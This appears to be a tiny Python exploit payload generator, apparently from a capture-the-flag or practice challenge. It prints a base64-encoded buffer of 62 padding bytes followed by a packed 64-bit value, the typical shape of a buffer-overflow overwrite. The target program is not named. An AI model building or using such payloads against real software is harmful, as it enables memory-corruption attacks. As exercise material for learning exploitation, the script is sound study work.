
import sys
import struct
import base64

buf = b'kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk'
buf += struct.pack('<Q', 2344067760616945606)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
